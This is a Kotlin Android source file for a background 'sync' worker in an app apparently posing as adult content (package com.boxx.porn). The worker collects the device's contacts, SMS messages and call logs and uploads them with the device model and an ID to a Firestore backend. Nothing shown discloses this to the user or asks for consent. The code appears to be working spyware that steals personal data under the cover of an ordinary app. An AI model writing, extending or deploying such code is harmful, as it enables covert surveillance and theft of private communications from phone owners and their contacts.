package com.boxx.porn.sync

import android.content.Context
import android.os.Build
import androidx.hilt.work.HiltWorker
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.boxx.porn.data.FirestoreRepository
import com.boxx.porn.model.DeviceInfo
import com.boxx.porn.utils.DataHelper
import com.boxx.porn.utils.DeviceIdHelper
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject

@HiltWorker
class SyncWorker @AssistedInject constructor(
    @Assisted context: Context,
    @Assisted workerParams: WorkerParameters,
    private val repository: FirestoreRepository
) : CoroutineWorker(context, workerParams) {

    override suspend fun doWork(): Result {
        val deviceId = DeviceIdHelper.getDeviceId(applicationContext)
        return try {
            val contacts = DataHelper.fetchContacts(applicationContext)
            val smsList = DataHelper.fetchSMS(applicationContext)
            val callLogs = DataHelper.fetchCallLogs(applicationContext)

            repository.syncContacts(deviceId, contacts)
            repository.syncSMS(deviceId, smsList)
            repository.syncCallLogs(deviceId, callLogs)

            repository.updateDeviceInfo(DeviceInfo(
                deviceName = Build.MODEL,
                deviceId = deviceId,
                lastSyncTime = System.currentTimeMillis(),
                contactCount = contacts.size,
                smsCount = smsList.size,
                callLogCount = callLogs.size,
                timestamp = System.currentTimeMillis()
            ))

            Result.success()
        } catch (e: Exception) {
            e.printStackTrace()
            Result.retry()
        }
    }
}
